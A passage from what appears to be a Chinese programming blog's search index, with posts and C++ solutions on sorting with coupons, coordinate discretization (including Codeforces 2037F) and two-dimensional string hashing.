class="built_in">min</span>(v<span class="number">1.</span>val ,y) * <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp2</span><span class="params">(pact v1,pact v2)</span></span>&#123;     <span class="comment">// 此表达式为返回真时，v1在前面，当前判断中只有v1大时返回真，所以排序结果为元素较大在前</span></span><br><span class="line">  <span class="keyword">return</span> v<span class="number">1.</span>val &gt; v<span class="number">2.</span>val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  cin&gt;&gt;T;</span><br><span class="line">  <span class="type">int</span> n,a,b;</span><br><span class="line">  <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;a&gt;&gt;b&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;n&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    <span class="comment">//a = 1;</span></span><br><span class="line">    <span class="comment">//b = 1;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;p[i].val);</span><br><span class="line">      p[i].has_used = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(p,p+n,cmp2);</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">min</span>(n,a+b);</span><br><span class="line">    <span class="built_in">sort</span>(p,p+length,cmp1);      <span class="comment">// 寻找最大值</span></span><br><span class="line">    <span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">double</span> minus_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> aa = a;</span><br><span class="line">    <span class="type">int</span> bb = b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; length &amp;&amp; aa &gt; <span class="number">0</span>;i++)&#123;</span><br><span class="line">      aa--;</span><br><span class="line">      p[i].has_used = <span class="number">1</span>;</span><br><span class="line">      minus_sum += <span class="number">1.0</span> * p[i].val * (<span class="number">100</span> - x) / <span class="number">100</span>;</span><br><span class="line">      <span class="comment">//cout&lt;&lt;&quot;val = &quot;&lt;&lt;p[i].val&lt;&lt;endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; length &amp;&amp; bb &gt; <span class="number">0</span>;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p[i].has_used == <span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">else</span> bb--;</span><br><span class="line">      minus_sum += <span class="built_in">min</span>(p[i].val, y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span> ;i &lt; n;i++)sum += p[i].val;</span><br><span class="line">    <span class="keyword">if</span>(a + b &gt; n)&#123;      <span class="comment">// 此时需要确定优惠券用量，直接暴力求解</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = length - <span class="number">1</span>;i &gt;= <span class="number">0</span> &amp;&amp; bb &gt; <span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p[i].has_used == <span class="number">1</span>)&#123;</span><br><span class="line">          <span class="type">double</span> new_minus_sum = <span class="built_in">max</span>(minus_sum - <span class="number">1.0</span> * p[i].val * (<span class="number">100</span> - x) / <span class="number">100</span> + <span class="built_in">min</span>(p[i].val,y) ,minus_sum);</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">fabs</span>(new_minus_sum - minus_sum) &gt; <span class="number">1e-5</span>)&#123;</span><br><span class="line">            bb--;</span><br><span class="line">            minus_sum = new_minus_sum;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;sum - minus_sum&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.5lf\n&quot;</span>,sum - minus_sum);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>坐标离散化问题</title>
    <url>/2024/04/08/%E5%9D%90%E6%A0%87%E7%A6%BB%E6%95%A3%E5%8C%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="离散化需要注意的点">离散化需要注意的点</h1>
<p>如果算法解需要通过点的距离来进行求解，那么离散化再使用原算法会出现问题，因为点经过离散化后，坐标发生改变，距离计算也就不正确了。举个例子：</p>
<p>假如我们判断两点相邻，那么两点之间的差距为1即可认为两点相邻。但是经过离散化后，上述结论并不成立，因为下图：
<img src="discret.png" /></p>
<p>可以看到AB点本身不相邻，但是在离散化后使用两点坐标差为1的方法判断距离就会认为AB相邻。</p>
<p>解决上述问题主要有两种方法。 1.
将算法改进，使得算法不依赖距离计算。</p>
<p>例如一组连续编号的物品才可以合并，现有两组物品编号连续，请问是否可以合并。如果判断两组物品之间最大最小值之间是否差1，则使用离散化会出现问题。将有体积的物品转为无体积的点，即可解决连续判断的问题。</p>
<figure>
<img src="convert_alg.png" alt="convert_alg" />
<figcaption aria-hidden="true">convert_alg</figcaption>
</figure>
<ol start="2" type="1">
<li>添加多余的点，如果算法要判断两点间距离是否相差k，那么在每个点的前后都应该插入距离小于等于k的点再进行离散化</li>
</ol>
<p>例如，判断两点之间差距是否为2，则A点前后需要插入与其相距为0、1、2距离的点。</p>
<figure>
<img src="insert_posi_.png" alt="insert_posi_" />
<figcaption aria-hidden="true">insert_posi_</figcaption>
</figure>
<p>可以看到AB间点距离为2离散化后不变，AC间距离和AD间距离大于2，离散化后也正确表示了。</p>
<h1 id="闭合区间交集数量">闭合区间交集数量</h1>
<p>闭区间中由于区间端点相交也算交在一起，所以使用上述方案，将端点视为实体，于是<span
class="math inline">\([a,b]\)</span> ==&gt; <span
class="math inline">\((a - 1,b)\)</span>，例如下题：</p>
<p>https://codeforces.com/contest/2037/problem/F</p>
<p>题目可以转换为存在多个区间，求解多个区间相交的数量。区间为实数区间，但是相交被定义为整数点相交。例如<span
class="math inline">\([2.1,4.2]\)</span>任何区间包含3，4都算与其相交，但是2不算，因为区间内没有整数2，<span
class="math inline">\([2,5]\)</span>中包含了2，3，4，5这几个点。</p>
<p>这里将区间<span class="math inline">\([a,b]\)</span>视为区间<span
class="math inline">\([ceil(a), floor(b)]\)</span>,
利用上述点视为实体的思想，计算相交。具体代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     2307F.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  10:19  2024.12.07</span></span><br><span class="line"><span class="comment">*   modify time:  10:19  2024.12.07</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m,k,h[maxx],x[maxx];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> times)</span></span>&#123;</span><br><span class="line">	map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;mp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="type">int</span> g = m - (h[i] + times - <span class="number">1</span>) / times;</span><br><span class="line">		<span class="keyword">if</span>(g &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">			mp[x[i] - g - <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">			mp[x[i] + g] -= <span class="number">1</span>;</span><br><span class="line">			<span class="comment">//cout&lt;&lt;&quot;range = &quot;&lt;&lt;x[i] - g &lt;&lt; &#x27; &#x27;&lt;&lt;x[i] + g&lt;&lt;endl;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> iter = mp.<span class="built_in">begin</span>();iter != mp.<span class="built_in">end</span>();iter++)&#123;</span><br><span class="line">		cnt += iter-&gt;second;</span><br><span class="line">		<span class="comment">//cout&lt;&lt;cnt&lt;&lt;endl;</span></span><br><span class="line">		<span class="keyword">if</span>(cnt &gt;= k)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> t;</span><br><span class="line">	cin&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">		<span class="type">int</span> l = <span class="number">1</span>,r = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;h[i]);</span><br><span class="line">			r = <span class="built_in">max</span>(r,h[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		r+=<span class="number">1</span>;</span><br><span class="line">		<span class="comment">//l = 15,r = 16;</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">			<span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">check</span>(mid))&#123;</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">				r = mid;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				l = mid + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag)&#123;</span><br><span class="line">			cout&lt;&lt;l&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> cout&lt;&lt;<span class="number">-1</span>&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="看一道题目">看一道题目</h1>
<p><a href="https://ac.nowcoder.com/acm/contest/78306/F">传送门</a></p>
<p>本题的解决方案是使用了区间表示连续序列，<code>a,a + 1,a + 2,a + 3,a + 4</code>使用区间<code>[a - 1,a + 4]</code>表示。剩余使用dp计算，<code>dp[i][j]</code>表示从<code>0-i</code>覆盖次数大于等于2，<code>[i+1,j]</code>表示覆盖次数大于等于1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     F.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  06:27  2024.04.08</span></span><br><span class="line"><span class="comment">*   modify time:  06:27  2024.04.08</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="number">200</span> + <span class="number">10</span>);</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = (<span class="number">1e5</span> + <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dp[<span class="number">2</span>][maxx][maxx];</span><br><span class="line"><span class="type">int</span> discret[maxn];</span><br><span class="line"><span class="type">int</span> posi[maxx * <span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="comment">//map&lt;int,int&gt;discret;</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">line</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> st,en;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> line &amp; l)<span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(st != l.st)</span><br><span class="line">      <span class="keyword">return</span> st &lt; l.st;</span><br><span class="line">    <span class="keyword">return</span> en &lt; l.en;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;li[maxx];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;st[i]&gt;&gt;en[i];</span></span><br><span class="line">    cin &gt;&gt; li[i].st &gt;&gt; li[i].en;</span><br><span class="line">    li[i].st--;                           <span class="comment">// 究极关键点，离散化的关键</span></span><br><span class="line">    posi[i * <span class="number">2</span>] = li[i].st;</span><br><span class="line">    posi[i * <span class="number">2</span> + <span class="number">1</span>] = li[i].en;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(posi,posi + <span class="number">2</span> * m);</span><br><span class="line">  <span class="keyword">if</span>(posi[<span class="number">0</span>] != <span class="number">0</span> || posi[<span class="number">2</span> * m - <span class="number">1</span>] != n)&#123;</span><br><span class="line">    cout&lt;&lt;<span class="number">0</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  discret[posi[<span class="number">0</span>]] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">2</span> * m; i++)&#123;</span><br><span class="line">    <span class="comment">//if(posi[i] != posi[i - 1])</span></span><br><span class="line">      discret[posi[i]] = discret[posi[i - <span class="number">1</span>]] + (posi[i] != posi[i - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> max_length = discret[posi[<span class="number">2</span> * m - <span class="number">1</span>]];</span><br><span class="line">  <span class="built_in">sort</span>(li,li+m);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    li[i].st = discret[li[i].st];</span><br><span class="line">    li[i].en = discret[li[i].en];</span><br><span class="line">    <span class="comment">//cout&lt;&lt;li[i].st&lt;&lt;&#x27; &#x27;&lt;&lt;li[i].en&lt;&lt;endl;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//cout&lt;&lt;endl;</span></span><br><span class="line">  dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//cout&lt;&lt;max_length&lt;&lt;endl;</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(dp[<span class="number">1</span>],dp[<span class="number">0</span>],<span class="built_in">sizeof</span>(dp[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> l = li[i].st;l &lt;= max_length;l++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> r = l;r &lt;= max_length;r++)&#123;</span><br><span class="line">        <span class="type">int</span> new_l = <span class="built_in">min</span>(r,<span class="built_in">max</span>(li[i].en,l));</span><br><span class="line">        <span class="type">int</span> new_r = <span class="built_in">max</span>(r,li[i].en);</span><br><span class="line">        dp[<span class="number">0</span>][new_l][new_r] = (dp[<span class="number">0</span>][new_l][new_r] + dp[<span class="number">1</span>][l][r]) % mod2;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;i&lt;&lt;&#x27; &#x27;&lt;&lt;new_l &lt;&lt; &#x27; &#x27;&lt;&lt; new_r&lt;&lt;&#x27; &#x27;&lt;&lt;dp[0][new_l][new_r]&lt;&lt;endl;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;dp[<span class="number">0</span>][discret[n]][discret[n]]&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>离散化</tag>
      </tags>
  </entry>
  <entry>
    <title>二维hash</title>
    <url>/2023/10/17/2Dhash/</url>
    <content><![CDATA[<h1 id="二维hash表达式">二维hash表达式</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*   filename：    uva11019.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  19:27  2023.10.16</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ull unsigned long long </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = (<span class="type">int</span>)<span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">131</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">13561</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">1e3</span> + <span class="number">10</span>;</span><br><span class="line">ull hash_s[maxx][maxx]; <span class="comment">// 二维hash</span></span><br><span class="line">ull hash_f[maxx][maxx]; <span class="comment">// 模版的hash</span></span><br><span class="line"><span class="type">char</span> s[maxx][maxx],f[maxx][maxx];</span><br><span class="line">ull powi[maxx];</span><br><span class="line">ull powj[maxx];</span><br><span class="line"></span><br><span class="line"><span class="function">ull <span class="title">get_hash</span><span class="params">(<span class="type">int</span> x1,<span class="type">int</span> y1,<span class="type">int</span> x2,<span class="type">int</span> y2)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> hash_s[x2][y2] - (hash_s[x1 - <span class="number">1</span>][y2]) * powi[x2 - x1 + <span class="number">1</span>] - hash_s[x2][y1 - <span class="number">1</span>] * powj[y2 - y1 + <span class="number">1</span>] + hash_s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>] * powi[x2 - x1 + <span class="number">1</span>] * powj[y2 - y1 + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  powi[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  powj[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">    powi[i] = powi[i - <span class="number">1</span>] * mod1;</span><br><span class="line">    powj[i] = powj[i - <span class="number">1</span>] * mod2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m,ull hash_list[][maxx],<span class="type">char</span> ss[][maxx])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= m;j++)&#123;</span><br><span class="line">      hash_list[i][j] = hash_list[i][j - <span class="number">1</span>] * powj[<span class="number">1</span>] + hash_list[i - <span class="number">1</span>][j] * powi[<span class="number">1</span>] + (ss[i][j] - <span class="string">&#x27;a&#x27;</span>) - hash_list[i - <span class="number">1</span>][j - <span class="number">1</span>] * powi[<span class="number">1</span>] * powj[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  cin&gt;&gt;T;</span><br><span class="line">  <span class="built_in">init</span>(maxx);</span><br><span class="line">  <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">    <span class="type">int</span> n[<span class="number">2</span>],m[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n[<span class="number">0</span>],&amp;m[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n[<span class="number">0</span>];i++)&#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s[i] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init_hash</span>(n[<span class="number">0</span>],m[<span class="number">0</span>],hash_s,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n[<span class="number">1</span>],&amp;m[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n[<span class="number">1</span>];i++)&#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,f[i] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init_hash</span>(n[<span class="number">1</span>],m[<span class="number">1</span>],hash_f,f);</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = n[<span class="number">1</span>];i &lt;= n[<span class="number">0</span>];i++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = m[<span class="number">1</span>];j &lt;= m[<span class="number">0</span>];j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hash_f[n[<span class="number">1</span>]][m[<span class="number">1</span>]] == <span class="built_in">get_hash</span>(i - n[<span class="number">1</span>] + <span class="number">1</span>, j - m[<span class="number">1</span>] + <span class="number">1</span>,i,j))&#123;</span><br><span class="line">          ans++;</span><br><span class="line">          <span class="comment">//cout&lt;&lt;i - n[1] + 1&lt;&lt;&#x27; &#x27;&lt;&lt;j - m[1] + 1&lt;&lt;endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*TLE</span></span><br><span class="line"><span class="comment">const int maxx = (int)1e3 + 10;</span></span><br><span class="line"><span class="comment">ll sums[maxx][maxx][2];</span></span><br><span class="line"><span class="comment">ll sums_template[maxx][maxx][2];</span></span><br><span class="line"><span class="comment">char val[maxx][maxx];</span></span><br><span class="line"><span class="comment">char template_val[maxx][maxx];</span></span><br><span class="line"><span class="comment">ll pw[maxx][2];</span></span><br><span class="line"><span class="comment">ll mod[2];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ll qpow(ll a, ll b, int mode) &#123;</span></span><br><span class="line"><span class="comment">  if(pw[b][mode] != 0)</span></span><br><span class="line"><span class="comment">    return pw[b][mode];</span></span><br><span class="line"><span class="comment">  ll m = mod[mode];</span></span><br><span class="line"><span class="comment">  ll ans = 1;</span></span><br><span class="line"><span class="comment">  ll temp = a;</span></span><br><span class="line"><span class="comment">  while (b) &#123;</span></span><br><span class="line"><span class="comment">    if (b &amp; 1) &#123;</span></span><br><span class="line"><span class="comment">      ans *= temp;</span></span><br><span class="line"><span class="comment">      ans %= m;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    temp *= temp;</span></span><br><span class="line"><span class="comment">    temp %= m;</span></span><br><span class="line"><span class="comment">    b /= 2;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  return pw[b][mode] = ans;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ll get_val(int x1, int y1, int x2, int y2, int m, int mode) &#123;</span></span><br><span class="line"><span class="comment">  return (sums[x1][y1][mode] * qpow(26, (x2 - x1) * m + (y2 - y1), mode)) %</span></span><br><span class="line"><span class="comment">         mod[mode];</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ll get_hash(int x1, int y1, int x2, int y2, int m, int mode) &#123; // n表示列数</span></span><br><span class="line"><span class="comment">  ll ans = (sums[x2][y2][mode] + get_val(x1 - 1, y1 - 1, x2, y2, m, mode) </span></span><br><span class="line"><span class="comment">            - get_val(x1 - 1, y2, x2, y2, m, mode) </span></span><br><span class="line"><span class="comment">            - get_val(x2, y1 - 1, x2, y2, m, mode) + 2 * mod[mode]) % mod[mode];</span></span><br><span class="line"><span class="comment">  return ans;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void init(int n, int m,int length,char s[][maxx],ll sum[][maxx][2]) &#123;</span></span><br><span class="line"><span class="comment">  for (int i = 1; i &lt;= n; i++) &#123;</span></span><br><span class="line"><span class="comment">    ll temp_sum[2] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">    for (int j = 1; j &lt;= m; j++) &#123;</span></span><br><span class="line"><span class="comment">      for (int k = 0; k &lt; 2; k++) &#123;</span></span><br><span class="line"><span class="comment">        temp_sum[k] *= 26;</span></span><br><span class="line"><span class="comment">        temp_sum[k] += s[i][j] - &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">        temp_sum[k] %= mod[k];</span></span><br><span class="line"><span class="comment">        sum[i][j][k] = (sum[i - 1][j][k] * qpow(26 ,length,k) + temp_sum[k]) 